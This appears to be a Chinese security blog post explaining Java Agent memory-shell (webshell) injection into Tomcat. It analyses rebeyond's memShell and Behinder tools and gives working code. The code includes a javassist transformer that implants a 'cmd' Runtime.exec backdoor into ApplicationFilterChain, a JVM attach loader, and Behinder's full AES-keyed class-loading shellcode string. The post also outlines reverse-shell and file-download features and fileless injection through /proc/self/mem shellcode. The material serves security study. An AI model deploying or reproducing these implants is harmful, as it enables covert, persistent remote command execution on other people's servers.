# 漏洞篇 - JavaAgent 内存马
> 2024-10-31
> 来源：https://changeyourway.github.io/2024/10/31/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC/

本文的前置知识：[基础篇 - Java Agent 详解](https://changeyourway.github.io/2024/10/23/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-JavaAgent%E8%AF%A6%E8%A7%A3/) 。

Java Agent 允许开发者在 JVM 运行时通过修改类的字节码，那么它其实就相当于 JVM 层面的一个拦截器或者说增强代理（类似于 AOP），既然如此，我们就可以在一些类中插入我们想要的代码逻辑。

## 实现思路

### 注入 ApplicationFilterChain

冰蝎作者 rebeyond 师傅的内存马项目（[https://github.com/rebeyond/memShell）选取](https://github.com/rebeyond/memShell%EF%BC%89%E9%80%89%E5%8F%96) ApplicationFilterChain 的 internalDoFilter 方法作为 hook 点，在 Tomcat 的运行过程中，ApplicationFilterChain 的 internalDoFilter 方法会被反复调用以执行过滤器的 DoFilter 方法。

为什么选择 ApplicationFilterChain 的 internalDoFilter 方法呢？一是它会经常被调用，二是该方法的两个参数（ServletRequest 和 ServletResponse）可以方便的处理请求信息，输出响应信息。这满足了内存马获取 Request 的条件以及输出回显的条件。

在 Agent.java 中定义了 agentmain 方法，其中注册了自定义转换器 Transformer ：

![](https://changeyourway.github.io/images/image-20241028111812947.png)

自定义类 Transformer 中重写了 transform 方法，利用 javassist 获取到了 ApplicationFilterChain 的 internalDoFilter 方法，用 insertBefore 方法将 readSource() 方法的返回值插入到获取方法的最前面：

![](https://changeyourway.github.io/images/image-20241028112010214.png)

readSource() 方法读取了一个 source.txt ，也就是说将这个文件中的内容插入了方法体：

![](https://changeyourway.github.io/images/image-20241028112251542.png)

source.txt 中定义了要插入的逻辑：

![](https://changeyourway.github.io/images/image-20241030135220790.png)

代码就不放全了，简要总结一下：

$1、$2 是 javassist 中的写法，表示方法的参数 1 和参数 2 。

**获取参数**：首先从 `HttpServletRequest` 中提取 `pass_the_world` 和 `model` 参数，其中：

-   `pass_the_world` 作为一个访问密码，用于校验请求的合法性。
-   `model` 表示执行操作的类型，不同的值对应不同的功能。

**验证密码**：如果 `pass_the_world` 不为空，且等于 `net.rebeyond.memshell.Agent.password`（即预设的密码），则认为验证通过，进入逻辑处理；否则，终止操作。

**操作分支**：根据 `model` 参数的值，执行对应的操作逻辑：

-   **帮助信息** (`help`)：如果 `model` 为空或未指定，调用 `net.rebeyond.memshell.Shell.help()` 方法，返回帮助信息。
-   **命令执行** (`exec`)：从请求参数中获取 `cmd`，并调用 `Shell.execute(cmd)` 方法执行系统命令，将结果返回。
-   **反向连接** (`connectback`)：从请求参数中获取 `ip` 和 `port`，调用 `Shell.connectBack(ip, port)` 建立反向连接。
-   **文件下载** (`urldownload`)：从请求中获取 `url` 和 `path` 参数，调用 `Shell.urldownload(url, path)` 下载文件到指定路径。
-   **目录列表** (`list`)：从请求中获取 `path` 参数，调用 `Shell.list(path)` 列出指定路径下的文件。
-   **删除文件** (`del`)：从请求中获取 `path` 参数，调用 `Shell.delete(path)` 删除指定路径的文件。
-   **显示文件内容** (`show`)：从请求中获取 `path`，调用 `Shell.showFile(path)` 显示文件内容。
-   **文件下载** (`download`)：从请求中获取 `path`，将对应文件的内容作为附件响应回客户端。
-   **文件上传** (`upload`)：从请求中获取 `path`、`content` 和 `type` 参数，通过 `Shell.upload(path, fileContent, type)` 将内容上传至服务器指定路径。
-   **代理** (`proxy`)：调用 `net.rebeyond.memshell.Proxy().doProxy(request, response)` 方法实现请求代理。
-   **chopper木马** (`chopper`)：通过 `net.rebeyond.memshell.Evaluate().doPost(request, response)` 执行远程代码。

**响应输出**：每个操作的结果会被写入 `response` 对象的输出流中返回给客户端。

可以看到这里实现了非常多不同的功能。

仿照上面的思路，我们可以插入对应的执行逻辑，实现一个较为简易的内存马。

首先是入口类 TestAgent ，其中定义了 agentmain 方法：

```
package InjectApplicationFilterChain;

import java.lang.instrument.Instrumentation;

public class TestAgent {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new TestTransform(), true);
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (int i = 0; i < loadedClasses.length; ++i) {
            Class clazz = loadedClasses[i];
            if (clazz.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
                try {
                    inst.retransformClasses(new Class[]{clazz});
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
```

然后是自定义转换器 TestTransform ，其中重写了 transform 方法，通过 javassist 获取 ApplicationFilterChain 的 internalDoFilter 方法，并在其中插入逻辑：

```
package InjectApplicationFilterChain;

import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class TestTransform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            System.out.println(classBeingRedefined.getName());
            // 获取 CtClass 对象的容器 ClassPool
            ClassPool classPool = ClassPool.getDefault();
            // 添加额外的类搜索路径
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }
            // 获取目标类
            CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");
            // 获取目标方法
            CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");
            // 设置要插入的内容
            String body ="javax.servlet.ServletRequest req = request;\n" +
                    "javax.servlet.ServletResponse res = response;" +
                    "String cmd = req.getParameter(\"cmd\");\n" +
                    "if (cmd != null) {\n" +
                    "Process process = Runtime.getRuntime().exec(cmd);\n" +
                    "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                    "new java.io.InputStreamReader(process.getInputStream()));\n" +
                    "StringBuilder stringBuilder = new StringBuilder();\n" +
                    "String line;\n" +
                    "while ((line = bufferedReader.readLine()) != null) {\n" +
                    "stringBuilder.append(line + '\\n');\n" +
                    "}\n" +
                    "res.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                    "res.getOutputStream().flush();\n" +
                    "res.getOutputStream().close();\n" +
                    "}";
            // 插入到方法开头
            ctMethod.insertBefore(body);
            // 返回目标类字节码
            return ctClass.toBytecode();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

利用这两个类生成 Agent jar 包，MANIFEST.MF 文件内容如下：

```
Manifest-Version: 1.0
Created-By: miaoji
Agent-Class: InjectApplicationFilterChain.TestAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

最后主类 TestMain attach 到 Tomcat 对应的 JVM 虚拟机，并加载对应的 Agent jar 包，Tomcat 运行起来后，对应的 JVM 虚拟机名称是 `org.apache.catalina.startup.Bootstrap`：

```
package InjectApplicationFilterChain;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class TestMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        // 调用 VirtualMachine.list() 获取正在运行的 JVM 列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        // System.out.println(list);
        for (VirtualMachineDescriptor vmd : list) {
            // System.out.println(vmd.displayName()+":"+vmd.id());
            // 遍历每一个正在运行的 JVM，找到属于 Tomcat 的 JVM 名称
            if (vmd.displayName().contains("org.apache.catalina.startup.Bootstrap")) {
                System.out.println(vmd.displayName() + ":" + vmd.id());
                // 连接指定 JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                // 加载 Agent
                virtualMachine.loadAgent("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\JavaAgentTest\\target\\JavaAgentTest-1.0-SNAPSHOT-jar-with-dependencies.jar");
                // 断开 JVM 连接
                virtualMachine.detach();
            }
        }
    }
}
```

当然，在运行主类之前，我们要先运行一个 Tomcat 。

注入成功：

![](https://changeyourway.github.io/images/image-20241030102633492.png)

### 注入 HttpServlet

很多 Servlet 都会选择继承 javax.servlet.http.HttpServlet 并重写其中的 service 方法，所以注入 HttpServlet 的 service 方法会更具通用性。

那么直接来看冰蝎中的实现，位于 net.rebeyond.behinder.resource.tools.MemShell 的 agentmain 方法。在这个方法中，HashMap 类 targetClasses 存放了要注入的类、方法和参数信息，并且提到了两个类：javax.servlet.http.HttpServlet 和 jakarta.servlet.http.HttpServlet ，也就是说这两个类都会被作为注入的对象：

![](https://changeyourway.github.io/images/image-20241030142723645.png)

如果检测到目标网站用的 weblogic ，那么选择注入 weblogic.servlet.internal.ServletStubImpl 类，这是因为 weblogic 调用 servlet 的逻辑不一样：

![](https://changeyourway.github.io/images/image-20241030142927646.png)

接着就是遍历所有已加载的类（这里的 cLasses 是方法第一行用 inst.getAllLoadedClasses() 获取到的），如果找到了 targetClasses 匹配的类名，就在对应的方法中注入 shellCode ：

![](https://changeyourway.github.io/images/image-20241030143615504.png)

这里并没有用到自定义转换器 ClassFileTransformer 的子类，而是直接调用 Instrumentation 的 redefineClasses 方法，将已经修改好的字节码内容直接替换进去，不需要重新加载类。

插入的内容 shellcode 是冰蝎中定义的全局变量，位于 net.rebeyond.behinder.core.Constants ：

![](https://changeyourway.github.io/images/image-20241030145535591.png)

```
public static String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"e45e329feb5d925b\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\njava.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();\nbyte[] buf = new byte[512];\nint length=request.getInputStream().read(buf);\nwhile (length>0)\n{\nbos.write(buf,0,length);\nlength=request.getInputStream().read(buf);\n}\n            byte[] requestBody=bos.toByteArray();\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
```

这样的 java agent 类生成的 jar 包位于 net.rebeyond.behinder.resource.tools.tools\_1.jar

使用这个 jar 包 attach JVM 的地方是在 net.rebeyond.behinder.payload.java.MemShell 的 doInjectAgent 方法中：

![](https://changeyourway.github.io/images/image-20241030145817392.png)

其中 libPath 应当是指示 jar 包所在的路径。

分析完了冰蝎中的注入逻辑，既然已经有了这么完美的代码，那我也不再重复造轮子了。

使用 javaAgent 理论上可以在任何类的任何方法注入逻辑，但是注入内存马一般选能够获取到 request 和 response 的地方，这样方便接收请求输出响应。例如 X1r0z 师傅提到的 org.apache.catalina.core.StandardWrapperValve#invoke ，或者是 su18 师傅提到的 org.springframework.web.servlet.DispatcherServlet#doService ，总之多种多样：

**（粗体为推荐使用的类）**

-   **org.apache.tomcat.websocket.server.WsFilter**
-   org.springframework.web.servlet.DispatcherServlet
-   org.apache.catalina.core.ApplicationFilterChain
-   **org.apache.catalina.core.StandardContextValve**
-   javax.servlet.http.HttpServlet（ Tomcat 10 之后，javax 变成 jarkara；Weblogic 环境下是 weblogic ）

## 注入方法

由于作者水平有限，所以注入方法也只能粗略的谈谈。

Agent 技术依赖于 jar 包，所以想要注入 Agent 内存马，一定要有一个 jar 包落地，所以在过去的利用方式中常常需要上传 jar 包：

-   2018 年，《利用“进程注入”实现无文件复活 WebShell》一文首次提出 memShell（内存马）概念，利用 Java Agent 技术向 JVM 内存中植入 webshell ，并在 github 上发布 memShell 项目。项目中对内存马的植入过程比较繁琐，需要三个步骤：
    1.  上传 inject.jar 到服务器用来枚举 jvm 并进行植入；
    2.  上传 agent.jar 到服务器用来承载 webshell 功能；
    3.  执行系统命令 java -jar inject.jar 。
-   2020 年，Behinder（冰蝎） v3.0 版本更新中内置了 Java 内存马注入功能，此次更新利用 self attach 技术，将植入过程由上文中的 3 个步骤减少为 2 个步骤：
    1.  上传 agent.jar 到服务器用来承载 webshell 功能；
    2.  冰蝎服务端调用 Java API 将 agent.jar 植入自身进程完成注入。

而后，为了解决需要文件落地的问题，rebeyond 和游望之师傅提出了更好的方案。为了方便理解接下来的内容，这里转载 cincly 师傅对于 JVM 类加载流程的总结。

### JVM 类加载流程

关于类的加载流程，可以从三个方面去入手：

-   正常的类加载流程
-   被 `redefineClasses` 后的类的加载流程
-   被 `retransformClasses` 后的类的加载流程

这一块的代码详细分析起来比较占用篇幅，这里主要阐述一下相关逻辑，以及关键步骤代码。有兴趣的可以自己跟着分析一下代码。

下面是 cincly 师傅整理的 java 类的加载流程图，可结合图下面的文字阐述进行理解：

![](https://changeyourway.github.io/images/20231126104326-93322fca-8c05-1-17303541292023.png)

-   java 类在内存中是以 [InstanceKlass](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/oops/instanceKlass.hpp#L43) 的形式存在的，这个 `InstanceKlass` 中便包含了类中所定义的变量、方法等信息。需要注意的是，当我们使用 java agent 技术时，虽然我们可以在 `ClassFileTransformer.transform` 中能拿到指定类的字节码，但内存中默认情况下其实是不会保存 java 类的原始字节码的。
-   正常的 java 类加载时，会从指定位置（一般也就是本地的 jar 包中）获取到类字节码，然后会经过 [JvmtiClassFileLoadHookPoster](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiExport.cpp#L511) 的转换后，得到最终的字节码。然后编译为对应的 `InstanceKlass`，当然在编译时会进行相应的优化，不过与本主题无关，这里不进行赘述。
    -   而这个 `JvmtiClassFileLoadHookPoster` 中维护着一个 [JvmtiEnv 链](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiExport.cpp#L574C12-L574C20) ，我们所用到的 `java agent` 技术中，当 agent 加载时，其实就是在这个 `JvmtiEnv` 链上添加一个 `JvmtiEnv` 节点，从而修改类的字节码，如 [post\_all\_envs()](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiExport.cpp#L569) 中所示。
    -   `JvmtiEnv` 实例中有个关键的变量: [`_env_local_storage`](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiEnvBase.hpp#L97)，这个变量所对应的类型是[`_JPLISEnvironment`](https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/instrument/JPLISAgent.h#L90)，从中我们可以看到与之关联的 `JPLISAgent`。而这个 `JPLISAgent` 就是 `InstrumentationImpl` 构造方法中的 `mNativeAgent` 。从这个 `_JPLISAgent` 中我们也可找到对应的 [instrumentation 实例](https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/instrument/JPLISAgent.h#L100)，以及其要执行的方法: [mTransform](https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/instrument/JPLISAgent.h#L103C1-L103C1)，也就是 `InstrumentationImpl` 类中的 [transform](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/jdk/src/share/classes/sun/instrument/InstrumentationImpl.java#L415) 方法。
    -   对于 `JvmtiEnv` 节点来说，具体的转换流程便是通过 [callback](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiExport.cpp#L607) 而实现的，具体的 `callback` 方法便是[eventHandlerClassFileLoadHook](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/jdk/src/share/instrument/InvocationAdapter.c#L476)，从中我们可以看到这个回调函数便是在 [transformClassFile](https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/instrument/JPLISAgent.c#L833) 方法中调用的 `InstrumentationImpl` 对象的 `transform` 方法，这样便回到了我们熟知的 `java` 代码中。
-   `redefineClasses`，顾名思义，重定义一个类，与普通的类加载流程相比，这里主要就是将类的来源更换为指定的字节码。具体的类加载流程并无太大差别。
-   当 java 类要被 `retransformClasses`转换时，会根据 `InstanceKlass` [重新生成一份对应的类字节码](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiEnv.cpp#L257)，并存入缓存中[`InstanceKlass._cached_class_file`](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/oops/instanceKlass.hpp#L258)，**下次再被 `retransformClasses` 时将直接使用缓存中的类字节码**。
    -   与正常的类加载流程相比，被 `retransformClasses` 所重新加载的类，不会再经过 `no retransformable jvmti` 链的处理。
-   java agent 在被加载时（[onLoad](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/jdk/src/share/instrument/InvocationAdapter.c#L144) / [onAttach](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/jdk/src/share/instrument/InvocationAdapter.c#L294)），jvm 将创建一个 `jvmtiEnv` 实例，对应了上图中的 `no retransformable jvmti` 链。
    -   当第一次添加 `retransformer`（也就是在 `addTransformer` 时指定 `canRetransform` 为 `true`）时，会**通过 [setHasRetransformableTransformers](https://github.com/openjdk/jdk8u/blob/9499e54ebbab17b0f5e48be27c0c7f90806a3c40/jdk/src/share/instrument/JPLISAgent.c#L1061) 方法在 jvmti 链上追加一个新的节点**，也就是上图中的 `retransformable jvmti 链`。
    -   关于图中的 `no retransformable jvmti` 链 与 `retransformable jvmti` 链，其实都是在一条链表上，只不过在使用时根据 [`env->is_retransformable()`](https://github.com/openjdk/jdk8u/blob/jdk8u121-b13/hotspot/src/share/vm/prims/jvmtiExport.cpp#L569) 而分为两批使用。在类加载或是被重定义时，对我们在 `java agent` 中添加的 `transformer` 来说，普通的 `transformer` 永远在 `canRetransform` 为 true 的 `transformer` 之前执行。

### 无 agent 文件注入

其实 agent 的 jar 包与 loadagent 加载最后都是为了产生 Instrumentation 对象，我们需要的是这个对象的 redefineClasses 方法或者 retransformClasses 方法来重新加载字节码，而这个重新加载的过程只需要提供字节码。那么有没有一种办法脱离 agent jar 包直接获取 Instrumentation 对象呢？游望之在 Linux 下内存马进阶植入技术一文中提出这个方法。

#### 获取 Instrumentation 对象

java.lang.instrument.Instrumentation 接口的实现类 java.sun.instrument.InstrumentationImpl 有一个指针 nativeAgent ，它是一个 native 指针（native 是一个函数，一个 Native Method 就是一个 Java 调用非 Java 代码的接口。 方法的实现由非 Java 语言实现，比如 C 或 C++ 。）：

![](https://changeyourway.github.io/images/image-20241031141647329.png)

#### 获取 nativeAgent 指针

接下来要想办法获得这个 nativeAgent 指针，为更底层的调用操作做铺垫。如何获得 nativeAgent 指针呢？先追踪 mNativeAgent 参数。mNativeAgent 被传入 redefineClasses0 方法：

![](https://changeyourway.github.io/images/image-20241031142153781.png)

redefineClasses0 方法在 Java 层的定义如下：

![](https://changeyourway.github.io/images/image-20241031144750179.png)

native 层在 idea 中没法跟进了，直接复制代码看吧。

redefineClasses0 方法的实现是这样的：

```
/*
 * Class:     sun_instrument_InstrumentationImpl
 * Method:    redefineClasses0
 * Signature: ([Ljava/lang/instrument/ClassDefinition;)V
 */
JNIEXPORT void JNICALL Java_sun_instrument_InstrumentationImpl_redefineClasses0
  (JNIEnv * jnienv, jobject implThis, jlong agent, jobjectArray classDefinitions) {
    redefineClasses(jnienv, (JPLISAgent*)(intptr_t)agent, classDefinitions);
}

/*
 *  Java code must not call this with a null list or a zero-length list.
 */
void
redefineClasses(JNIEnv * jnienv, JPLISAgent * agent, jobjectArray classDefinitions) {
    jvmtiEnv*   jvmtienv                        = jvmti(agent);
    jboolean    errorOccurred                   = JNI_FALSE;
    jclass      classDefClass                   = NULL;
    jmethodID   getDefinitionClassMethodID      = NULL;
    jmethodID   getDefinitionClassFileMethodID  = NULL;
    jvmtiClassDefinition* classDefs             = NULL;
    jbyteArray* targetFiles                     = NULL;
    jsize       numDefs                         = 0;

    jplis_assert(classDefinitions != NULL);

    numDefs = (*jnienv)->GetArrayLength(jnienv, classDefinitions);
    errorOccurred = checkForThrowable(jnienv);
    jplis_assert(!errorOccurred);

    if (!errorOccurred) {
        jplis_assert(numDefs > 0);
        /* get method IDs for methods to call on class definitions */
        classDefClass = (*jnienv)->FindClass(jnienv, "java/lang/instrument/ClassDefinition");
        errorOccurred = checkForThrowable(jnienv);
        jplis_assert(!errorOccurred);
    }

    ...
}
```

Java\_sun\_instrument\_InstrumentationImpl\_redefineClasses0 是 redefineClasses0 的 JNI 实现，其中有四个参数：

-   `JNIEnv *jnienv`：JNI 环境指针，用于与 JVM 交互。
-   `jobject implThis`：Java 对象的引用。
-   `jlong agent`：JVMTI 代理的指针，转换为 `JPLISAgent` 类型。它对应 long nativeAgent 参数。
-   `jobjectArray classDefinitions`：表示类定义的数组（`ClassDefinition` 对象数组）。它对应 ClassDefinition\[\] definitions 参数。

redefineClasses0 方法接下来调用 redefineClasses 方法，agent 参数被强转为 JPLISAgent 类型。JPLISAgent 结构体定义如下：

```
struct _JPLISAgent {
    JavaVM *                mJVM;                   /* handle to the JVM */
    JPLISEnvironment        mNormalEnvironment;     /* for every thing but retransform stuff */
    JPLISEnvironment        mRetransformEnvironment;/* for retransform stuff only */
    jobject                 mInstrumentationImpl;   /* handle to the Instrumentation instance */
    jmethodID               mPremainCaller;         /* method on the InstrumentationImpl that does the premain stuff (cached to save lots of lookups) */
    jmethodID               mAgentmainCaller;       /* method on the InstrumentationImpl for agents loaded via attach mechanism */
    jmethodID               mTransform;             /* method on the InstrumentationImpl that does the class file transform */
    jboolean                mRedefineAvailable;     /* cached answer to "does this agent support redefine" */
    jboolean                mRedefineAdded;         /* indicates if can_redefine_classes capability has been added */
    jboolean                mNativeMethodPrefixAvailable; /* cached answer to "does this agent support prefixing" */
    jboolean                mNativeMethodPrefixAdded;     /* indicates if can_set_native_method_prefix capability has been added */
    char const *            mAgentClassName;        /* agent class name */
    char const *            mOptionsString;         /* -javaagent options string */
};

struct _JPLISEnvironment {
    jvmtiEnv *              mJVMTIEnv;              /* the JVM TI environment */
    JPLISAgent *            mAgent;                 /* corresponding agent */
    jboolean                mIsRetransformer;       /* indicates if special environment */
};
```

redefineClasses 的第一行代码是 `jvmtiEnv* jvmtienv = jvmti(agent)` ， 这个 jvmti 是个宏，宏定义的意思是从 \_JPLISAgent 结构体中提取成员变量 mNormalEnvironment ，再从 mNormalEnvironment 中提取 mJVMTIEnv：

```
#define jvmti(a) a->mNormalEnvironment.mJVMTIEnv
```

jvmtiEnv 提供了RedefineClasses 函数，Java Instrumentation API 的同样功能就是封装于此之上。既然如此，后面起作用的就是这个 jvmtiEnv 指针了。

jvmtiEnv 指针的获取方式如宏定义中所展示的那样，是从 \_JPLISAgent 结构体中取成员属性 mNormalEnvironment ，这个 mNormalEnvironment 又是 JPLISEnvironment 类型，然后从 mNormalEnvironment 中取 mJVMTIEnv 属性。于是我们希望能够知道这个 mJVMTIEnv 属性是怎样被赋值的，也即整个 \_JPLISAgent 结构体变量是如何被创建的，这样才能去尝试修改。

#### 获取 jvmtiEnv 指针

目标是修改 jvmtiEnv 指针，但是从创建 \_JPLISAgent 结构体变量的方式入手不太可行，游望之师傅提到 JPLISAgent 实例是通过 native 函数 createNewJPLISAgent 创建的，但该函数是内部函数，没有从动态库中导出，Java 层也没办法直接调用。

所以思路回到获取 jvmtiEnv 指针本身。在 createNewJPLISAgent 函数中有这样一段代码：

```
*agent_ptr = NULL;
   jnierror = (*vm)->GetEnv(  vm,
                              (void **) &jvmtienv,
```

其中 vm 是 JavaVM 指针，这指示了 jvmtiEnv 指针可以通过 JavaVM 对象获取。而在 JDK 的 jni.h 中，有定义 JavaVM 对象的导出方法（ jni.h 是 JNI（Java Native Interface）库的头文件）：

```
_JNI_IMPORT_OR_EXPORT_ jint JNICALL JNI_GetCreatedJavaVMs(JavaVM **, jsize, jsize *);
```

该方法由 libjvm.so 导出，我们可以通过此 API 获得 JavaVM 对象，通过 JavaVM 对象就能获得 jvmtiEnv 指针。

rebeyond 师傅解释：JNI\_GetCreatedJavaVMs 函数是 JVM 提供给 Java Native 开发人员用来在 Native 层获取 VM 对象的，因为是开放给开发者使用的，所以该函数是导出的。我们可以直接调用这个函数来获取 JavaVM 对象。而该函数的规矩用法是先开发一个 Java 的 dll 动态链接库，然后在 Java 代码中加载这个 dll 库，然后再调用 dll 中的方法。

但是这样会造成有文件落地，为了无文件的调用 JNI\_GetCreatedJavaVMs 函数，rebeyond 师傅提出了在 Windows 系统中通过获取 JNI\_GetCreatedJavaVMs 地址的方法来调用它，大致流程如下：

1.  先获取到当前进程 kernel32.dll 的基址；
2.  在 kernel32.dll 的输出表中，获取 GetProcessAddress 函数的地址；
3.  调用 GetProcessAddress 获取 LoadLibraryA 函数的地址；
4.  调用 LoadLibraryA 加载 jvm.dll 获取 jvm.dll 模块在当前进程中的基址；
5.  调用 GerProcAddress 在 jvm.dll 中获取 JNI\_GetCreatedJavaVMs 的地址；
6.  调用 JNI\_GetCreatedJavaVMs ；
7.  还原现场，安全退出线程，优雅地离开，避免 shellcode 执行完后进程崩溃。

而在 Linux 环境下，游望之师傅也提出了获取 JNI\_GetCreatedJavaVMs 地址并调用的方式：

1.  解析 ELF ，得到 Java\_java\_io\_RandomAccessFile\_length 和 JNI\_GetCreatedJavaVMs
2.  生成利用 JNI\_GetCreatedJavaVMs 获取 jvmtienv 指针的 shellcode
3.  在 Java\_java\_io\_RandomAccessFile\_length 放置 shellcode 并调用
4.  恢复 Java\_java\_io\_RandomAccessFile\_length 代码

后续的话就可以利用获取到的 jvmtienv 指针来构造 \_JPLISAgent 结构体变量了。

总结就是利用 Linux 中的 /proc/self/mem 修改内存，将 Java 原生的 native 函数（比如 Java\_java\_io\_RandomAccessFile\_length）的地址指向的内容替换为 shellcode ，这样就可以执行 shellcode 了。执行完后再把原来的内容放回去，好一招偷天换日。不过既然可以修改内存了那其实就可以执行任意代码了。

通过这样的方式就实现了只需要通过执行代码就能注入 Agent 内存马，而不需要文件落地。我对内存和汇编还不太熟，所以后面没有具体去分析了。

**JNI 介绍**

JNI（Java Native Interface）Java 本地接口，又叫 Java 原生接口。它允许 Java 调用 C/C++ 的代码，同时也允许在 C/C++ 中调用 Java 的代码。

这里涉及到了 JNI 这个知识点，有空的话出一篇它的使用方法。

## 总结

越是深入底层，能干的事情就越多。

## 参考文章

[su18 - Java Agent 内存马](https://www.javasec.org/javaweb/MemoryShell/#java-agent-%E5%86%85%E5%AD%98%E9%A9%AC)

[枫 - Java 安全学习 —— 内存马](https://goodapple.top/archives/1355)

[rebeyond - 论如何优雅的注入 Java Agent 内存马](https://xz.aliyun.com/t/11640?u_atoken=51e90d7cf00b65040063ba01952906cd&u_asig=1a0c380917302884758923926e003f)

[X1r0z - Java Agent 内存马](https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%88%A9%E7%94%A8-java-agent-%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC)

[cincly - Agent 内存马的攻防之道](https://xz.aliyun.com/t/13110?u_atoken=e86e6b4001ff42cfc61f74967dc01666&u_asig=ac11000117303458213856370e003f)

[游望之 - Linux 下内存马进阶植入技术](https://xz.aliyun.com/t/10186)
